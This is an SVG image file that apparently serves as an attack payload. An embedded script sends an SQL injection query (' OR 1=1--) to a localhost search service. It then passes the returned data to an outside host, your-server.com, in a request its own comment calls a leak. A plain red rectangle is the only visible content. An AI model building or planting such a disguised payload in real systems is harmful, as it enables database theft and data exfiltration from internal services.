<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch("http://localhost:8001/search?q=' OR 1=1--")
      .then(response => response.text())
      .then(data => {
        // Leak data via an external server (if JS is allowed)
        fetch("https://your-server.com/leak?data=" + encodeURIComponent(data));
      });
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
